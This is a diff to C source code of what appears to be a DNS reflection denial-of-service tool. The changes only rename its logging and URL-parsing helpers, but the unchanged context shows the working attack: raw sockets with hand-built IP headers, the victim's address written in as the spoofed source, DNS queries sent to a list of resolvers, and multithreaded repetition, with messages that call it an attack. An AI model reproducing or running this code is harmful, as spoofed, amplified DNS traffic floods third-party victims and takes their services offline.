@@ -19,18 +19,18 @@
 #include "main.h"
 #include "dns_reflect_dos.h"
 
-extern int Debug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
-extern int DebugInfo(const char *fmt, ...);
-extern int DebugWarning(const char *fmtsring, ...);
-extern int DebugError(const char *fmt, ...);
+extern int ShowMessage(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
+extern int InfoMessage(const char *fmt, ...);
+extern int DebugMessage(const char *fmtsring, ...);
+extern int ErrorMessage(const char *fmt, ...);
 
 extern void FreeProcessDNSIPListBuff(pStrHeader p);
 extern pStrHeader ProcessDNSIPListFile(pStrHeader *output);
 extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
 extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);
 
-extern void FreeSplitURLBuff(pSplitURLOutput p);
-extern int SplitURL(const char *url, pSplitURLOutput *output);
+extern void FreeSplitUrlBuff(pSplitUrlOutput p);
+extern int SplitUrl(const char *url, pSplitUrlOutput *output);
 extern void SignalExit(int signo);
 
 extern pIPList_Thread SplitIPForThread(pIPList_Thread *output, const pInput input, const pStrHeader str_header);
@@ -66,17 +66,17 @@ static int ChangetoDNSNameFormat(char *input)
     char *host = (char *)malloc(strlen(DNS_QUERY_NAME_DEFAULT) + 2);
     if (!host)
     {
-        DebugError("ChangetoDNSNameFormat malloc failed");
+        ErrorMessage("ChangetoDNSNameFormat malloc failed");
         return 1;
     }
     if (!strcpy(host, DNS_QUERY_NAME_DEFAULT))
     {
-        DebugError("ChangetoDNSNameFormat strcpy failed");
+        ErrorMessage("ChangetoDNSNameFormat strcpy failed");
         return 1;
     }
     if (!strcat(host, "."))
     {
-        DebugError("ChangetoDNSNameFormat strcat failed");
+        ErrorMessage("ChangetoDNSNameFormat strcat failed");
         return 1;
     }
     int host_len = strlen(host);
@@ -105,16 +105,16 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (socket_fd < 0)
     {
-        DebugError("Create socket failed: %s(%d)", strerror(errno), errno);
+        ErrorMessage("Create socket failed: %s(%d)", strerror(errno), errno);
         if (errno == 1)
         {
-            DebugWarning("This program should run as root user");
+            DebugMessage("This program should run as root user");
         }
         else if (errno == 24)
         {
-            DebugWarning("You shoud check max file number use 'ulimit -n' in linux");
-            DebugWarning("And change the max file number use 'ulimit -n <setting number>'");
-            DebugWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
+            DebugMessage("You shoud check max file number use 'ulimit -n' in linux");
+            DebugMessage("And change the max file number use 'ulimit -n <setting number>'");
+            DebugMessage("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
         }
         return 1;
     }
@@ -141,7 +141,7 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     const int *val = &one;
     if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        DebugError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
+        ErrorMessage("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
         //exit(0);
         return 1;
     }
@@ -188,7 +188,7 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     pQuery query = (pQuery)(datagram + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader));
     if (ChangetoDNSNameFormat(&(query->name)))
     {
-        DebugError("DNS name translate failed");
+        ErrorMessage("DNS name translate failed");
         return 1;
     }
     // memcpy(query->name, DNS_QUERY_NAME_DEFAULT, strlen(DNS_QUERY_NAME_DEFAULT));
@@ -197,10 +197,10 @@ static int SendDNS(const pDNSStruct ds, const int debug_level)
     question->qtype = htons(DNS_QUERY_TYPE_DEFAULT); //type of the query , A , MX , CNAME , NS etc
     question->qclass = htons(1);                     //its internet (lol)
 
-    Debug(2, debug_level, "Sending Packet...");
+    ShowMessage(2, debug_level, "Sending Packet...");
     if (sendto(socket_fd, datagram, pksize, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
     {
-        DebugError("Send failed: %s(%d)", strerror(errno), errno);
+        ErrorMessage("Send failed: %s(%d)", strerror(errno), errno);
     }
 
     free(datagram);
@@ -214,32 +214,32 @@ static int AttackThread(pDNSStruct dns_struct)
 
     int i;
     pStrNode str_node = dns_struct->str_header->next;
-    pSplitURLOutput split_result;
+    pSplitUrlOutput split_result;
 
-    Debug(DEBUG_LEVEL_3, dns_struct->debug_level, "AttackThread start sending data...");
+    ShowMessage(VERBOSE, dns_struct->debug_level, "AttackThread start sending data...");
 
     while (str_node)
     {
 
         // in here, we deal with the ip list
-        if (!SplitURL(str_node->str, &split_result))
+        if (!SplitUrl(str_node->str, &split_result))
         {
-            DebugError("AttackThread SplitURL failed");
+            ErrorMessage("AttackThread SplitUrl failed");
             return 1;
         }
 
         // node cicle
 
-        Debug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->protocol);
-        Debug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->host);
-        Debug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %d", split_result->port);
-        Debug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->suffix);
+        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %s", split_result->protocol);
+        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %s", split_result->host);
+        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %d", split_result->port);
+        ShowMessage(DEBUG, dns_struct->debug_level, "split_reult: %s", split_result->suffix);
 
         if (split_result->port == 0)
         {
             if (strlen(split_result->host) == 0)
             {
-                DebugError("AttackThread SplitURL not right");
+                ErrorMessage("AttackThread SplitUrl not right");
                 return 1;
             }
             // make the port as default
@@ -249,21 +249,21 @@ static int AttackThread(pDNSStruct dns_struct)
         dns_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
         if (!(dns_struct->dst_ip))
         {
-            DebugError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+            ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
             return 1;
         }
         if (!memset(dns_struct->dst_ip, 0, IP_BUFFER_SIZE))
         {
-            DebugError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+            ErrorMessage("AttackThread memset failed: %s(%d)", strerror(errno), errno);
             return 1;
         }
         if (!strncpy(dns_struct->dst_ip, split_result->host, strlen(split_result->host)))
         {
-            DebugError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+            ErrorMessage("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
             return 1;
         }
         dns_struct->dst_port = split_result->port;
-        FreeSplitURLBuff(split_result);
+        FreeSplitUrlBuff(split_result);
 
         // for test
         //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);
@@ -272,7 +272,7 @@ static int AttackThread(pDNSStruct dns_struct)
         {
             if (SendDNS(dns_struct, dns_struct->debug_level))
             {
-                DebugError("AttackThread Attack failed");
+                ErrorMessage("AttackThread Attack failed");
                 return 1;
             }
         }
@@ -290,32 +290,32 @@ int StartDNSReflectAttack(const pInput input)
     pthread_attr_t attr;
     int j, ret;
 
-    Debug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
+    ShowMessage(VERBOSE, input->debug_level, "Enter StartSYNFlood");
     signal(SIGINT, SignalExit);
 
     pDNSStruct dns_struct = (pDNSStruct)malloc(sizeof(DNSStruct));
     pStrHeader str_header;
-    pSplitURLOutput split_result;
+    pSplitUrlOutput split_result;
 
     dns_struct->debug_level = input->debug_level;
     dns_struct->each_ip_repeat = input->each_ip_repeat;
 
     if (!ProcessDNSIPListFile(&str_header))
     {
-        DebugError("ProcessDNSIPListFile failed");
+        ErrorMessage("ProcessDNSIPListFile failed");
         return 1;
     }
 
-    if (!SplitURL(input->address, &split_result))
+    if (!SplitUrl(input->address, &split_result))
     {
-        DebugError("AttackThread SplitURL failed");
+        ErrorMessage("AttackThread SplitUrl failed");
         return 1;
     }
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
         {
-            DebugError("AttackThread SplitURL not right");
+            ErrorMessage("AttackThread SplitUrl not right");
             return 1;
         }
         // make the port as default
@@ -325,27 +325,27 @@ int StartDNSReflectAttack(const pInput input)
     dns_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(dns_struct->src_ip))
     {
-        DebugError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!memset(dns_struct->src_ip, 0, IP_BUFFER_SIZE))
     {
-        DebugError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
+        ErrorMessage("AttackThread memset failed: %d(%s)", strerror(errno), errno);
         return 1;
     }
     if (!strncpy(dns_struct->src_ip, input->address, strlen(input->address)))
     {
-        DebugError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
+        ErrorMessage("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     dns_struct->src_port = (int)split_result->port;
 
-    FreeSplitURLBuff(split_result);
+    FreeSplitUrlBuff(split_result);
 
     pIPList_Thread list, tmp_list;
     if (!SplitIPForThread(&list, input, str_header))
     {
-        DebugError("SplitIPForThread failed");
+        ErrorMessage("SplitIPForThread failed");
         return 1;
     }
     // str_header no longer used
@@ -368,24 +368,24 @@ int StartDNSReflectAttack(const pInput input)
             //input->serial_num = (i * input->max_thread) + j;
             if (pthread_attr_init(&attr))
             {
-                DebugError("StartSYNFlood pthread_attr_init failed");
+                ErrorMessage("StartSYNFlood pthread_attr_init failed");
                 return 1;
             }
             //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
             if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
             {
-                DebugError("StartSYNFlood pthread_attr_setdetachstate failed");
+                ErrorMessage("StartSYNFlood pthread_attr_setdetachstate failed");
                 return 1;
             }
             // create thread
             ret = pthread_create(&tid[j], &attr, (void *)AttackThread, dns_struct);
             //printf("j is: %d\n", j);
-            Debug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+            ShowMessage(DEBUG, input->debug_level, "tid: %ld", tid[j]);
             // here we make a map
             if (ret != 0)
             {
-                Debug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-                DebugError("Create pthread failed");
+                ShowMessage(DEBUG, input->debug_level, "ret: %d", ret);
+                ErrorMessage("Create pthread failed");
                 return 1;
             }
             pthread_attr_destroy(&attr);
@@ -413,32 +413,32 @@ int StartDNSReflectAttack(const pInput input)
 
 int StartDNSReflectTest(const pInput input)
 {
-    Debug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
+    ShowMessage(VERBOSE, input->debug_level, "Enter StartSYNFlood");
     signal(SIGINT, SignalExit);
 
     pDNSStruct dns_struct = (pDNSStruct)malloc(sizeof(DNSStruct));
     pStrHeader str_header;
-    pSplitURLOutput split_result;
+    pSplitUrlOutput split_result;
 
     dns_struct->debug_level = input->debug_level;
     dns_struct->each_ip_repeat = input->each_ip_repeat;
 
     if (!ProcessDNSIPListFile(&str_header))
     {
-        DebugError("ProcessDNSIPListFile failed");
+        ErrorMessage("ProcessDNSIPListFile failed");
         return 1;
     }
 
-    if (!SplitURL(input->address, &split_result))
+    if (!SplitUrl(input->address, &split_result))
     {
-        DebugError("AttackThread SplitURL failed");
+        ErrorMessage("AttackThread SplitUrl failed");
         return 1;
     }
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
         {
-            DebugError("AttackThread SplitURL not right");
+            ErrorMessage("AttackThread SplitUrl not right");
             return 1;
         }
         // make the port as default
@@ -448,28 +448,28 @@ int StartDNSReflectTest(const pInput input)
     dns_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(dns_struct->src_ip))
     {
-        DebugError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!memset(dns_struct->src_ip, 0, IP_BUFFER_SIZE))
     {
-        DebugError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
+        ErrorMessage("AttackThread memset failed: %d(%s)", strerror(errno), errno);
         return 1;
     }
     if (!strncpy(dns_struct->src_ip, input->address, strlen(input->address)))
     {
-        DebugError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
+        ErrorMessage("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     dns_struct->src_port = (int)split_result->port;
 
-    FreeSplitURLBuff(split_result);
+    FreeSplitUrlBuff(split_result);
 
     pIPList_Thread list;
     pIPList_Thread tmp_list;
     if (!SplitIPForThread(&list, input, str_header))
     {
-        DebugError("SplitIPForThread failed");
+        ErrorMessage("SplitIPForThread failed");
         return 1;
     }
     // str_header no longer used
